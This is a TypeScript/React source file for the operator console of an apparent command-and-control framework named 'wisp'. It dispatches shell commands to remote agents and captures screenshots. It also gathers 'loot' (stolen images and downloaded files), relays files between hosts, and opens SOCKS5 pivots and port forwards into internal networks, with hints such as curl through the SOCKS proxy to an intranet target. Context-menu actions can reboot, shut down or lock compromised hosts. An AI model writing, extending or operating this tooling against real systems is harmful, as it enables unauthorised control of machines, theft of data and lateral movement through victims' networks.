      {mode === 'shell' ? (
        <div className="agent-term"><TermPanel session={session} /></div>
      ) : (
        <>
          <div className="agent-console-body" ref={bodyRef}>
            {lines.length === 0 && <div className="c-out muted">{t('agentCmdHint')}</div>}
            {lines.map((l, i) => <div key={i} className={`agent-line ${l.kind}`}>{l.text}</div>)}
          </div>
          <div className="agent-input-row">
            <span className="agent-prompt">›</span>
            <input
              value={line}
              onChange={(e) => setLine(e.target.value)}
              placeholder={t('agentCmdPh')}
              onKeyDown={(e) => {
                if (e.key === 'Enter') { e.preventDefault(); void send(); }
                else if (e.key === 'ArrowUp') {
                  e.preventDefault();
                  const n = Math.min(hist.length - 1, hIdx + 1);
                  if (n >= 0 && hist.length) { setHIdx(n); setLine(hist[n]); }
                } else if (e.key === 'ArrowDown') {
                  e.preventDefault();
                  const n = hIdx - 1;
                  setHIdx(n);
                  setLine(n < 0 ? '' : hist[n]);
                }
              }}
            />
            <button disabled={busy || !line.trim()} onClick={() => void send()}>{t('agentSend')}</button>
          </div>
        </>
      )}
    </div>
  );
}

function DispatchLog({ session }: { session: Session }) {
  const { t } = useI18n();
  const tasks = useStore((s) => s.tasks);
  const [open, setOpen] = useState<Set<string>>(new Set());
  const rows = useMemo(
    () => tasks.filter((x) => x.session === session.id).slice().sort((a, b) => b.task.created - a.task.created).slice(0, 200),
    [tasks, session.id],
  );
  const toggle = (id: string) => setOpen((x) => { const n = new Set(x); if (n.has(id)) n.delete(id); else n.add(id); return n; });
  return (
    <div className="agent-pane">
      <div className="agent-pane-hd">
        <b>{t('agentLog')}</b>
        <span className="spacer" />
        <span className="muted">{rows.length}</span>
      </div>
      <div className="agent-log-list">
        {rows.length === 0 && <div className="empty">{t('agentNoLog')}</div>}
        {rows.map((r) => {
          const id = r.task.id;
          const isOpen = open.has(id);
          const stCls = r.status === 'completed' ? 'ok' : r.status === 'failed' ? 'err' : 'run';
          let args = '';
          try { args = typeof r.task.args === 'string' ? r.task.args : JSON.stringify(r.task.args ?? {}); } catch { args = String(r.task.args ?? ''); }
          const cmd = CMD_NAMES[r.task.cmd] ?? `#${r.task.cmd}`;
          const out = r.result?.output ?? '';
          return (
            <div key={id} className={`agent-log-item${isOpen ? ' open' : ''}`} onClick={() => toggle(id)}>
              <div className="agent-log-meta">
                <span className={`agent-st ${stCls}`}>{r.status}</span>
                <span className="agent-cmd mono">{cmd}</span>
                <span className="spacer" />
                <span className="muted">{shortTime(r.task.created)}</span>
              </div>
              {args && args !== '{}' && <div className="agent-log-args mono" title={args}>{args}</div>}
              {r.result && (
                <div className="agent-log-out" title={out}>
                  {r.result.ok ? '' : '⚠ '}{out || `[exit ${r.result.exit}]`}
                </div>
              )}
            </div>
          );
        })}
      </div>
    </div>
  );
}

function ShotPanel({ session }: { session: Session }) {
  const { t } = useI18n();
  const runTask = useStore((s) => s.runTask);
  const [img, setImg] = useState('');
  const [busy, setBusy] = useState(false);
  const [err, setErr] = useState('');
  const grab = async () => {
    if (busy) return;
    setBusy(true); setErr(''); setImg('');
    try {
      const rec = await runTask(session.id, 'screenshot', {}, 60000);
      if (rec.status !== 'completed' || !rec.result?.output) throw new Error(rec.result?.output || t('failedWord'));
      setImg((JSON.parse(rec.result.output) as { img: string }).img);
    } catch (e) { setErr(String(e)); }
    finally { setBusy(false); }
  };
  return (
    <div className="agent-mon">
      <div className="agent-mon-bar">
        <button className="p" disabled={busy} onClick={() => void grab()}>{busy ? t('shotBusy') : t('shotBtn')}</button>
        {err && <span className="agent-err" title={err}>⚠ {err.slice(0, 80)}</span>}
      </div>
      <div className="agent-mon-body">
        {img ? <img src={img} alt="screenshot" /> : <div className="agent-placeholder">{busy ? t('shotBusy') : t('agentShotEmpty')}</div>}
      </div>
    </div>
  );
}

function AgentInfoPanel({ session }: { session: Session }) {
  const { t } = useI18n();
  return (
    <div className="agent-info-page">
      <div className="agent-info-card">
        <h3>{t('agentInfo')}</h3>
        <div className="info-grid">
          <b>Agent ID</b><span className="mono">{session.id}</span>
          <b>{T('fStatus')}</b><span>{session.status} · seq {session.seq} · {T('fPending')} {session.pending}</span>
          <b>{T('fHost')}</b><span>{session.info.hostname} · {session.info.internal_ip || '—'}</span>
          <b>{T('fProc')}</b><span className="mono">{session.info.process} (pid {session.info.pid})</span>
          <b>{T('fUser')}</b><span>{session.info.user}</span>
          <b>{T('fSys')}</b><span>{session.info.os}/{session.info.arch} · agent {session.info.agent_ver}</span>
          <b>{t('agentCaps')}</b><span className="mono">{session.caps?.length ? session.caps.join(' · ') : '—'}</span>
          <b>{t('agentProject')}</b><span>{session.project}</span>
          <b>{t('agentFirstSeen')}</b><span>{fullTime(session.first_seen)}</span>
          <b>{t('agentLastSeen')}</b><span>{fullTime(session.last_seen)}</span>
        </div>
      </div>
      <div className="agent-info-card">
        <h3>{t('agentLabels')}</h3>
        <div className="meta-edit agent-meta-edit">
          <div className="meta-row">
            <label>{T('metaTags')}</label><MetaTags sid={session.id} />
            <label>{T('metaColor')}</label><MetaColor sid={session.id} />
          </div>
          <MetaNotes sid={session.id} />
        </div>
      </div>
    </div>
  );
}

// VSplit: drag the console/files/terminal strip taller or shorter.
function VSplit() {
  const setBottomH = useStore((s) => s.setBottomH);
  const start = (e: React.MouseEvent) => {
    e.preventDefault();
    const y0 = e.clientY;
    const h0 = useStore.getState().bottomH;
    const move = (ev: MouseEvent) => {
      const max = Math.max(160, window.innerHeight - 220);
      setBottomH(Math.min(max, Math.max(120, h0 - (ev.clientY - y0))));
    };
    const up = () => {
      window.removeEventListener('mousemove', move);
      window.removeEventListener('mouseup', up);
    };
    window.addEventListener('mousemove', move);
    window.addEventListener('mouseup', up);
  };
  return <div className="vsplit" onMouseDown={start} onDoubleClick={() => setBottomH(230)} title={T('vsplitHint')} />;
}

interface CtxAct {
  ico: string;
  lbl: string;
  sec?: string;
  danger?: boolean;
  confirm?: string;
  cmd?: string;
  act?: () => void;
  sub?: CtxAct[];
}

function CtxMenu({ pos, onClose }: {
  pos: { x: number; y: number; id: string };
  onClose: () => void;
}) {
  const { t } = useI18n();
  const st = useStore();
  const id = pos.id;
  const openTab = (k: DynKind, s?: string) => st.openTab(k, s ?? id);
  const menuRef = useRef<HTMLDivElement>(null);
  const [active, setActive] = useState(-1);
  const [subActive, setSubActive] = useState(-1);

  useEffect(() => { menuRef.current?.focus(); }, []);

  useEffect(() => {
    const close = () => onClose();
    const esc = (e: KeyboardEvent) => { if (e.key === 'Escape') onClose(); };
    window.addEventListener('mousedown', close);
    window.addEventListener('keydown', esc);
    return () => { window.removeEventListener('mousedown', close); window.removeEventListener('keydown', esc); };
  }, [onClose]);

  const run = async (a: CtxAct) => {
    if (a.confirm && !window.confirm(a.confirm)) return;
    a.act?.();
    if (a.cmd) {
      try { await st.dispatch(id, a.cmd, {}); }
      catch (e) { useStore.setState({ error: String(e) }); }
    }
    onClose();
  };

  const items: CtxAct[] = [
    { sec: t('mSecInteract'), ico: '>_', lbl: t('mOpenShell'), act: () => openTab('term') },
    { ico: '▤', lbl: t('mFiles'), act: () => openTab('files') },
    { ico: '▣', lbl: t('mShot'), act: () => { openTab('info'); st.reqShot(id); } },
    { ico: '▭', lbl: t('mRemote'), act: () => window.open(`/rc/${id}?token=${encodeURIComponent(localStorage.getItem('wisp_token') ?? '')}`, '_blank') },
    { ico: '⇄', lbl: t('mProxies'), act: () => openTab('proxies') },
    {
      sec: t('mSecChannel'), ico: '⇥', lbl: t('mFwdMenu'),
      act: () => {
        const target = window.prompt(`${t('mFwd')}: ${st.sessions.find((x) => x.id === id)?.info.hostname ?? id.slice(0, 8)} → teamserver local?`, '127.0.0.1:3389');
        if (!target) return;
        void Api.forwards.create(id, target)
          .then((d) => st.toast({ kind: 'ok', text: `🔀 ${d.listen} → ${d.target}` }))
          .catch((e) => st.toast({ kind: 'err', text: `⚠ ${e instanceof Error ? e.message : String(e)}` }));
      },
    },
    {
      ico: '◇', lbl: t('mSocksMenu'),
      act: () => {
        void Api.socks.create(id)
          .then((d) => st.toast({ kind: 'ok', text: `🌐 SOCKS5 ${d.listen}— curl --socks5-hostname ${d.listen} http://intranet-target` }))
          .catch((e) => st.toast({ kind: 'err', text: `⚠ ${e instanceof Error ? e.message : String(e)}` }));
      },
    },
    { sec: t('mSecInfo'), ico: '≡', lbl: t('mConsole'), act: () => st.setActiveTab('console') },
    { ico: 'ⓘ', lbl: t('mDetail'), act: () => openTab('info') },
    { ico: '◷', lbl: t('mTimeline'), act: () => openTab('timeline') },
    { ico: '⧉', lbl: t('mCopyId'), act: () => void copy(id, 'Agent ID') },
    { ico: '⧉', lbl: t('mCopyIp'), act: () => void copy(useStore.getState().sessions.find((x) => x.id === id)?.info.internal_ip ?? '', 'IP') },
    {
      sec: t('mSecManage'), ico: '▦', lbl: t('mComputer'), sub: [
        { ico: '⟳', lbl: t('mReboot'), danger: true, cmd: 'reboot', confirm: t('cReboot') },
        { ico: '⏻', lbl: t('mShutdown'), danger: true, cmd: 'shutdown', confirm: t('cShutdown') },
        { ico: '⇤', lbl: t('mLogoff'), cmd: 'logoff', confirm: t('cLogoff') },
        { ico: '⊘', lbl: t('mLock'), cmd: 'lock' },
      ],
    },
    {
      ico: '☰', lbl: t('mSession'), sub: [
        { ico: '⊗', lbl: t('mKill'), danger: true, cmd: 'kill', confirm: t('cKill') },
        { ico: '⇥', lbl: t('mExit'), cmd: 'exit', confirm: t('cExit') },
        {
          ico: '⌫', lbl: t('mDelRec'), danger: true, confirm: t('cDelRec'),
          act: () => {
            void Api.sessions.remove(id)
              .then(() => st.refresh())
              .catch(() => {});
          },
        },
      ],
    },
  ];

  // Reserve room for the flyout so it always opens to the right of the menu.
  const menuLeft = Math.min(pos.x, Math.max(8, window.innerWidth - 236 - 220));
  const style: React.CSSProperties = {
    left: menuLeft,
    top: Math.min(pos.y, Math.max(8, window.innerHeight - 520)),
  };
  const onKey = (e: React.KeyboardEvent<HTMLDivElement>) => {
    if (e.key === 'ArrowDown' || e.key === 'ArrowUp') {
      e.preventDefault();
      const dir = e.key === 'ArrowDown' ? 1 : -1;
      const sub = subActive >= 0 ? items[active]?.sub : undefined;
      if (sub?.length) {
        setSubActive((subActive + dir + sub.length) % sub.length);
        return;
      }
      const base = active < 0 ? (dir > 0 ? -1 : 0) : active;
      setActive((base + dir + items.length) % items.length);
      return;
    }
    if (e.key === 'ArrowRight') {
      if (items[active]?.sub) { e.preventDefault(); setSubActive(0); }
      return;
    }
    if (e.key === 'ArrowLeft') {
      if (subActive >= 0) { e.preventDefault(); setSubActive(-1); }
      return;
    }
    if (e.key === 'Enter' || e.key === ' ') {
      const it = items[active];
      if (!it) return;
      e.preventDefault();
      if (it.sub) {
        if (subActive >= 0) void run(it.sub[subActive]);
        else setSubActive(0);
      } else {
        void run(it);
      }
    }
  };
  let lastSec = '';
  return (
    <div className="ctx-menu" ref={menuRef} tabIndex={-1} onKeyDown={onKey} style={style} onMouseDown={(e) => e.stopPropagation()} onContextMenu={(e) => e.preventDefault()}>
      {items.map((it, i) => {
        const showSec = !!it.sec && it.sec !== lastSec;
        if (showSec) lastSec = it.sec!;
        return (
          <div key={i}>
            {showSec && <div className={`ctx-sec${i === 0 ? ' first' : ''}`}>{it.sec}</div>}
            {it.sub ? (
              <div className={`ctx-item sub${i === active ? ' kb' : ''}${i === active && subActive >= 0 ? ' kb-open' : ''}`}
                aria-haspopup="menu"
                onMouseEnter={() => { setActive(i); setSubActive(-1); }}>
                <span className="ctx-ico">{it.ico}</span><span className="ctx-lbl">{it.lbl}</span><span className="ctx-arrow">›</span>
                <div className="ctx-sub">
                  {it.sub.map((sj, si) => (
                    <div key={sj.lbl}
                      className={`ctx-item${sj.danger ? ' danger' : ''}${si === subActive ? ' kb' : ''}`}
                      onMouseEnter={() => setSubActive(si)}
                      onClick={() => void run(sj)}>
                      <span className="ctx-ico">{sj.ico}</span><span className="ctx-lbl">{sj.lbl}</span>
                    </div>
                  ))}
                </div>
              </div>
            ) : (
              <div className={`ctx-item${i === active ? ' kb' : ''}`}
                onMouseEnter={() => { setActive(i); setSubActive(-1); }}
                onClick={() => void run(it)}>
                <span className="ctx-ico">{it.ico}</span><span className="ctx-lbl">{it.lbl}</span>
              </div>
            )}
          </div>
        );
      })}
    </div>
  );
}


const G_CMDS = ['shell', 'sysinfo', 'pwd', 'ls', 'ps', 'screenshot', 'sleep', 'kill', 'exit', 'socks', 'fwd', 'rc', 'info', 'hist', 'sessions', 'listeners', 'clear', 'help'];

function Console() {
  const all = useStore((s) => s.tasks);
  const sessions = useStore((s) => s.sessions);
  const dispatch = useStore((s) => s.dispatch);
  const [line, setLine] = useState('');
  const [echo, setEcho] = useState<{ id: number; text: string; err?: boolean }[]>([]);
  const [hist, setHist] = useState<string[]>(() => JSON.parse(localStorage.getItem('wisp_hist') ?? '[]'));
  const [hIdx, setHIdx] = useState(-1);
  const [clearMark, setClearMark] = useState(0);
  const [expanded, setExpanded] = useState<Set<string>>(new Set());
  const bottom = useRef<HTMLDivElement>(null);
  const body = useRef<HTMLDivElement>(null);
  const stickRef = useRef(true);
  useEffect(() => {
    if (stickRef.current) body.current?.scrollTo({ top: body.current.scrollHeight, behavior: 'smooth' });
  }, [all.length, echo.length]);

  const visible = useMemo(() => all.filter((t) => t.task.created >= clearMark).slice(-300), [all, clearMark]);
  const say = (text: string, err = false) => setEcho((x) => [...x.slice(-99), { id: Date.now() + Math.random(), text, err }]);
  const H = { headers: { 'X-Wisp-Token': localStorage.getItem('wisp_token') ?? '', 'Content-Type': 'application/json' } };

  const resolve = (tok?: string): { s?: Session; err?: string } => {
    if (!tok) return { err: T('gNeedTarget') };
    let m: Session[];
    if (tok.startsWith('#')) {
      const n = +tok.slice(1);
      m = sessions.filter((x) => x.num === n);
    } else {
      const lw = tok.toLowerCase();
      m = sessions.filter((x) => x.id.startsWith(lw) || x.info.hostname.toLowerCase().startsWith(lw));
    }
    if (!m.length) return { err: `${T('gNoTarget')} (${tok})` };
    if (m.length > 1) return { err: `${T('gAmbiguous')}: ${m.map((x) => `#${x.num} ${x.id.slice(0, 8)}`).join(', ')}` };
    return { s: m[0] };
  };

  const sessLine = (x: Session) => `#${String(x.num).padEnd(4)}${x.id.slice(0, 12).padEnd(14)}${(x.info.hostname + '        ').slice(0, 18)}${(x.info.user + '/' + x.info.os + '          ').slice(0, 16)}${(x.status + '      ').slice(0, 9)}${ago(x.last_seen)}`;

  const send = async () => {
    const raw = line.trim();
    if (!raw) return;
    setHist((h) => {
      const n = [raw, ...h.filter((x) => x !== raw)].slice(0, 50);
      localStorage.setItem('wisp_hist', JSON.stringify(n));
      return n;
    });
    setHIdx(-1);
    setLine('');
    const [head, ...rest] = raw.split(/\s+/);
    const cmd = head.toLowerCase();
    const target = rest[0];
    const withT = (fn: (s: Session) => void) => {
      const r = resolve(target);
      if (r.err) { say(`⚠ ${cmd}: ${r.err}`, true); return; }
      fn(r.s!);
    };
    const fire = (id: string, name: string, args: Record<string, unknown>) =>
      void dispatch(id, name, args).catch((e) => say(`⚠ ${e}`, true));

    switch (cmd) {
      case 'help': say(T('gHelp')); return;
      case 'clear': setClearMark(Math.floor(Date.now() / 1000)); setEcho([]); return;
      case 'sessions':
        say(sessions.length ? sessions.map(sessLine).join('\n') : T('gNoSessions'));
        return;
      case 'listeners': {
        const l = await fetch('/api/listeners', H).then((r) => r.json()).catch(() => []);
        say(Array.isArray(l) && l.length ? l.map((x: { name: string; kind: string; addr: string; running: boolean; agents: number }) => `${(x.name + '            ').slice(0, 14)}${(x.kind + '      ').slice(0, 9)}${(x.addr + '                ').slice(0, 18)}${x.running ? '● running' : '○ stopped'}  agents=${x.agents}`).join('\n') : T('noLsn'));
        return;
      }
      case 'shell':
        withT((s) => {
          const command = raw.slice(raw.indexOf(target) + target.length).trim();
          if (!command) { say(`⚠ ${T('gUsageShell')}`, true); return; }
          fire(s.id, 'shell', { command, timeout_ms: 15000 });
        });
        return;
      case 'sysinfo': case 'pwd': case 'ps': case 'screenshot': case 'kill': case 'exit':
        withT((s) => fire(s.id, cmd, {}));
        return;
      case 'ls':
        withT((s) => fire(s.id, 'ls', { path: rest.slice(1).join(' ') }));
        return;
      case 'sleep':
        withT((s) => fire(s.id, 'sleep', { sleep_ms: +target2(rest) || 5000, jitter_pct: 30 }));
        return;
      case 'socks':
        withT((s) => void fetch('/api/socks', { ...H, method: 'POST', body: JSON.stringify({ session: s.id, listen: '127.0.0.1:0' }) })
          .then(async (r) => { const d = await r.json(); say(r.ok ? `✓ SOCKS5 ${d.listen}  (curl --socks5-hostname ${d.listen} http://intranet)` : `⚠ ${d.error}`, !r.ok); }));
        return;
      case 'fwd': {
        const tg = rest[1];
        if (!tg) { say(`⚠ usage: fwd <target> <host:port>`, true); return; }
        withT((s) => void fetch('/api/forwards', { ...H, method: 'POST', body: JSON.stringify({ session: s.id, listen: '127.0.0.1:0', target: tg }) })
          .then(async (r) => { const d = await r.json(); say(r.ok ? `✓ ${d.listen} → ${s.info.hostname}:${tg}` : `⚠ ${d.error}`, !r.ok); }));
        return;
      }
      case 'rc': {
        const r = resolve(target);
        if (r.err) { say(`⚠ rc: ${r.err}`, true); return; }
        window.open(`/rc/${r.s!.id}?token=${encodeURIComponent(localStorage.getItem('wisp_token') ?? '')}`, '_blank');
        return;
      }
      case 'hist':
        withT((sess) => {
          const rows = all.filter((x) => x.session === sess.id).slice(-20);
          say(rows.length ? rows.map((x) => {
            const st = x.status === 'completed' ? '✓' : x.status === 'failed' ? '✗' : x.status;
            let c = CMD_NAMES[x.task.cmd] ?? `cmd#${x.task.cmd}`;
            try { const cc = (JSON.parse(String(x.task.args ?? '{}')) as { command?: string }).command; if (cc) c = `shell: ${cc.slice(0, 60)}`; } catch { /* raw */ }
            return `${new Date(x.task.created * 1000).toLocaleTimeString()}  ${st}  ${c}`;
          }).join('\n') : T('gNoHist'));
        });
        return;
      case 'info':
        withT((s) => say([
          `#${s.num}  ${s.id}`,
          `host=${s.info.hostname}  user=${s.info.user}  os=${s.info.os}/${s.info.arch}`,
          `pid=${s.info.pid}  ip=${s.info.internal_ip}  ver=${s.info.agent_ver}  status=${s.status}  seq=${s.seq}  pending=${s.pending}`,
        ].join('\n')));
        return;
      default:
        say(`⚠ ${T('gUnknown')} "${head}" — ${T('gTryHelp')}`, true);
    }
  };

  const target2 = (rest: string[]) => rest[1];

  const onKey = (e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Enter') { void send(); return; }
    if (e.key === 'l' && (e.metaKey || e.ctrlKey)) { e.preventDefault(); setClearMark(Math.floor(Date.now() / 1000)); return; }
    if (e.key === 'ArrowUp') {
      e.preventDefault();
      const i = Math.min(hIdx + 1, hist.length - 1);
      if (hist[i] !== undefined) { setHIdx(i); setLine(hist[i]); }
      return;
    }
    if (e.key === 'ArrowDown') {
      e.preventDefault();
      const i = hIdx - 1;
      setHIdx(i);
      setLine(i >= 0 ? hist[i] ?? '' : '');
      return;
    }
    if (e.key === 'Tab') {
      e.preventDefault();
      const parts = line.split(/\s+/);
      if (parts.length <= 1) {
        const hit = G_CMDS.filter((c) => c.startsWith(parts[0].toLowerCase()));
        if (hit.length === 1) setLine(hit[0] + ' ');
        else if (hit.length > 1) setLine(hit.reduce((a, c) => { let i = 0; while (i < a.length && i < c.length && a[i] === c[i]) i++; return a.slice(0, i); }));
      } else if (parts.length === 2) {
        const w = parts[1].toLowerCase();
        const cands = sessions.flatMap((x) => [`#${x.num}`, x.id.slice(0, 12), x.info.hostname]).filter((c) => c.toLowerCase().startsWith(w));
        if (cands.length === 1) setLine(parts[0] + ' ' + cands[0] + ' ');
        else if (cands.length > 1) setLine(parts[0] + ' ' + cands.reduce((a, c) => { let i = 0; while (i < a.length && i < c.length && a[i].toLowerCase() === c[i].toLowerCase()) i++; return a.slice(0, i); }));
      }
    }
  };

  const renderOutput = (tk: (typeof visible)[number]) => {
    const out = tk.result?.output ?? '';
    if (!out) return null;
    if (out.startsWith('{"img":"data:image')) {
      try {
        const img = (JSON.parse(out) as { img: string }).img;
        return (
          <div className="c-line">
            <img className="c-shot" src={img} alt="screenshot" onClick={() => window.open(img, '_blank')} title={T('shotZoom')} />
          </div>
        );
      } catch { /* fall through */ }
    }
    let pretty = out;
    try { pretty = JSON.stringify(JSON.parse(out), null, 1); } catch { /* plain */ }
    const lines = pretty.split('\n');
    const long = lines.length > 15;
    const open = expanded.has(tk.task.id) || !long;
    const shown = open ? lines : lines.slice(0, 12);
    return (
      <>
        {shown.map((l, i) => (
          <div className="c-line" key={i}><span className="c-out">&nbsp;&nbsp;<Ansi line={l} /></span></div>
        ))}
        {long && (
          <div className="c-line c-more" onClick={() => setExpanded((x) => new Set(x).add(tk.task.id))}>
            &nbsp;&nbsp;{T('expandAll')} {lines.length} {T('linesWord')}
          </div>
        )}
      </>
    );
  };

  return (
    <div className="console col">
      <div className="c-scroll" ref={body} onScroll={(e) => { const el = e.currentTarget; stickRef.current = el.scrollHeight - el.scrollTop - el.clientHeight < 48; }}>
        {visible.map((tk) => {
          const sess = sessions.find((x) => x.id === tk.session);
          return (
            <div key={tk.task.id}>
              <div className="c-line">
                <span className="c-time">[{new Date(tk.task.created * 1000).toLocaleTimeString()}]</span>
                <span className="c-sess" title={tk.session} onClick={() => useStore.getState().setSelected(tk.session)}>#{sess?.num ?? '?'} {(sess?.info.hostname ?? tk.session.slice(0, 8)).slice(0, 14)}</span>
                <span className="c-prompt">wisp&gt;</span>
                <span className="c-cmd">{(tk.task.args as { command?: string })?.command ?? CMD_NAMES[tk.task.cmd] ?? `cmd#${tk.task.cmd}`}</span>
                <span className={`c-out muted`} style={{ marginLeft: 8 }}>
                  {tk.status === 'completed' ? '✓' : tk.status === 'failed' ? '✗' : tk.status === 'sent' ? '…' : '·'}
                </span>
                {(tk.status === 'completed' || tk.status === 'failed') && tk.updated > 0 && (
                  <span className="c-dur">{tk.updated - tk.task.created <= 0 ? '<1s' : `${tk.updated - tk.task.created}s`}</span>
                )}
                {(tk.result?.output ?? '') !== '' && (
                  <span className="c-copy" title="copy output" onClick={() => void copy(tk.result!.output, `#${tk.task.id.slice(0, 6)}`)}>⧉</span>
                )}
              </div>
              {renderOutput(tk)}
            </div>
          );
        })}
        {echo.map((e) => (
          <div className="c-line" key={e.id}><span className={e.err ? 'c-gerr' : 'c-gout'}>{e.text}</span></div>
        ))}
        {visible.length === 0 && !echo.length && (
          <div className="c-line"><span className="c-out muted">{T('gWelcome')}</span></div>
        )}
        <div ref={bottom} />
      </div>
      <div className="c-input">
        <span className="c-prompt">wisp&gt;</span>
        <input
          value={line}
          onChange={(e) => setLine(e.target.value)}
          onKeyDown={onKey}
          placeholder={T('gInputPh')}
        />
      </div>
    </div>
  );
}


function useMeta(sid: string) {
  const sess = useStore((s) => s.sessions.find((x) => x.id === sid));
  const patch = async (body: Record<string, unknown>) => {
    await fetch(`/api/sessions/${sid}/meta`, { method: 'PATCH', headers: { 'X-Wisp-Token': localStorage.getItem('wisp_token') ?? '', 'Content-Type': 'application/json' }, body: JSON.stringify(body) });
    void useStore.getState().refresh();
  };
  return { sess, patch };
}

function MetaTags({ sid }: { sid: string }) {
  const { sess, patch } = useMeta(sid);
  const [v, setV] = useState<string | null>(null);
  const val = v ?? (sess?.tags ?? []).join(', ');
  return <input className="meta-tags" value={val} onChange={(e) => setV(e.target.value)}
    onBlur={() => { if (v !== null) { void patch({ tags: v.split(/[,，]/).map((x) => x.trim()).filter(Boolean) }); setV(null); } }}
    placeholder={T('metaTagsPh')} />;
}

const META_COLORS = ['', '#f44747', '#cca700', '#4ec9b0', '#3794ff', '#b072e8'];
function MetaColor({ sid }: { sid: string }) {
  const { sess, patch } = useMeta(sid);
  return <select className="meta-color" value={sess?.color ?? ''} onChange={(e) => void patch({ color: e.target.value })}>
    <option value="">—</option>
    {META_COLORS.filter(Boolean).map((c) => <option key={c} value={c}>{c}</option>)}
  </select>;
}

function MetaNotes({ sid }: { sid: string }) {
  const { sess, patch } = useMeta(sid);
  const [v, setV] = useState<string | null>(null);
  return <textarea className="meta-notes" rows={3} value={v ?? sess?.notes ?? ''} placeholder={T('metaNotesPh')}
    onChange={(e) => setV(e.target.value)}
    onBlur={() => { if (v !== null && v !== sess?.notes) { void patch({ notes: v }); setV(null); } }} />;
}

interface Loots { images: { session: string; ts: number; data: string }[]; files: { id: string; agent: string; remote: string; size: number; status: string; ts: number }[] }

function LootPanel() {
  const sessions = useStore((s) => s.sessions);
  const [lo, setLo] = useState<Loots | null>(null);
  const [zoom, setZoom] = useState('');
  const [xSrc, setXSrc] = useState('');
  const [xDst, setXDst] = useState('');
  const [xSrcPath, setXSrcPath] = useState('');
  const [xDstPath, setXDstPath] = useState('');
  const [xBusy, setXBusy] = useState('');
  const [xVia, setXVia] = useState('');
  const H = { headers: { 'X-Wisp-Token': localStorage.getItem('wisp_token') ?? '' } };
  useEffect(() => {
    const f = () => fetch('/api/loots', H).then((r) => r.json()).then(setLo).catch(() => {});
    f();
    const t = setInterval(f, 8000);
    return () => clearInterval(t);
    // eslint-disable-next-line
  }, []);
  const tagOf = (id: string) => { const x = sessions.find((y) => y.id === id); return x ? `#${x.num} ${x.info.hostname}` : id.slice(0, 8); };
  return (
    <div className="tabpage" style={{ padding: 16, overflowY: 'auto' }}>
      <section>
        <h3>🎒 {T('lootImages')} ({lo?.images.length ?? 0})</h3>
        <div className="loot-grid">
          {(lo?.images ?? []).map((im, i) => (
            <figure key={i} onClick={() => setZoom(im.data)}>
              <img src={im.data} alt="" />
              <figcaption>{tagOf(im.session)} · {new Date(im.ts * 1000).toLocaleTimeString()}</figcaption>
            </figure>
          ))}
          {!lo?.images.length && <div className="empty">{T('lootEmpty')}</div>}
        </div>
      </section>
      <section>
        <h3>📥 {T('lootFiles')} ({lo?.files.length ?? 0})</h3>
        <table className="lsn-t">
          <thead><tr><th>{T('thTarget')}/path</th><th>{T('thSession')}</th><th>{T('thSize')}</th><th>{T('thStatus')}</th><th></th></tr></thead>
          <tbody>
            {(lo?.files ?? []).map((f) => (
              <tr key={f.id}>
                <td className="mono">{f.remote}</td>
                <td className="mono">{tagOf(f.agent)}</td>
                <td>{fmtSize(f.size)}</td>
                <td><span className={f.status === 'done' ? 'c-ok' : 'c-muted'}>{f.status}</span></td>
                <td className="lsn-acts">{f.status === 'done' && <a className="p" href={`/api/files/${f.id}/download?token=${encodeURIComponent(localStorage.getItem('wisp_token') ?? '')}`} download>⬇</a>}</td>
              </tr>
            ))}
            {!lo?.files.length && <tr><td colSpan={5} className="empty">{T('lootEmpty')}</td></tr>}
          </tbody>
        </table>
      </section>
      <section>
        <h3>🔁 {T('xferTitle')}</h3>
        <p className="set-hint">{T('xferHint')}</p>
        <div className="lsn-new xfer-form">
          <select value={xSrc} onChange={(e) => setXSrc(e.target.value)}>
            <option value="">src…</option>
            {sessions.filter((x) => x.status === 'online').map((x) => <option key={x.id} value={x.id}>#{x.num} {x.info.hostname}</option>)}
          </select>
          <input style={{ width: 200 }} placeholder="/path/on/src" value={xSrcPath} onChange={(e) => setXSrcPath(e.target.value)} />
          <span className="muted">→</span>
          <select value={xDst} onChange={(e) => setXDst(e.target.value)}>
            <option value="">dst…</option>
            {sessions.filter((x) => x.status === 'online' && x.id !== xSrc).map((x) => <option key={x.id} value={x.id}>#{x.num} {x.info.hostname}</option>)}
          </select>
          <input style={{ width: 200 }} placeholder="/path/on/dst" value={xDstPath} onChange={(e) => setXDstPath(e.target.value)} />
          <button className="p" disabled={!xSrc || !xDst || !xSrcPath || !xDstPath || !!xBusy} onClick={() => {
            setXBusy(T('xferRun'));
            void fetch('/api/transfer', { method: 'POST', headers: { 'X-Wisp-Token': localStorage.getItem('wisp_token') ?? '', 'Content-Type': 'application/json' }, body: JSON.stringify({ src: xSrc, dst: xDst, src_path: xSrcPath, dst_path: xDstPath }) })
              .then(async (r) => {
                const d = await r.json();
                if (!r.ok) { setXBusy(''); useStore.getState().toast({ kind: 'err', text: `⚠ ${d.error}` }); return; }
                setXVia(d.via ?? '');
                const poll = setInterval(() => {
                  void fetch(`/api/tasks?session=${xDst}`, { headers: { 'X-Wisp-Token': localStorage.getItem('wisp_token') ?? '' } }).then((x) => x.json()).then((ts: { task: { id: string }; status: string; result?: { output: string } }[]) => {
                    const t = ts.find((y) => y.task.id === d.fetch_task);
                    if (!t || (t.status !== 'completed' && t.status !== 'failed')) return;
                    clearInterval(poll);
                    setXBusy('');
                    useStore.getState().toast({ kind: t.status === 'completed' ? 'ok' : 'err', text: t.status === 'completed' ? `🔁 ${T('xferDone')} ${(t.result?.output ?? '').slice(0, 90)}` : `⚠ ${(t.result?.output ?? '').slice(0, 90)}` });
                  });
                }, 2000);
              });
          }}>{xBusy || `🔁 ${T('xferGo')}`}</button>
          {xVia && <span className="set-msg">via {xVia}</span>}
        </div>
      </section>
      {zoom && <div className="loot-zoom" onClick={() => setZoom('')}><img src={zoom} alt="" /></div>}
    </div>
  );
}


type TLE = { ts: number; kind: string; icon: string; title: string; sub?: string; ok?: boolean; img?: string; href?: string };

function TimelinePanel({ session }: { session?: Session }) {
  const tasks = useStore((s) => s.tasks);
  const jobs = useStore((s) => s.jobs);
  const events = useStore((s) => s.events);
  const [zoom, setZoom] = useState('');
  if (!session) return <div className="console"><div className="c-out muted">{T('pickSessionWord')}</div></div>;
  const feed: TLE[] = [
    ...tasks.filter((t) => t.session === session.id).map((t): TLE => {
      let title = CMD_NAMES[t.task.cmd] ?? `cmd#${t.task.cmd}`;
      try { const cc = (JSON.parse(String(t.task.args ?? '{}')) as { command?: string }).command; if (cc) title = cc; } catch { /* raw */ }
      const out = t.result?.output ?? '';
      let img: string | undefined;
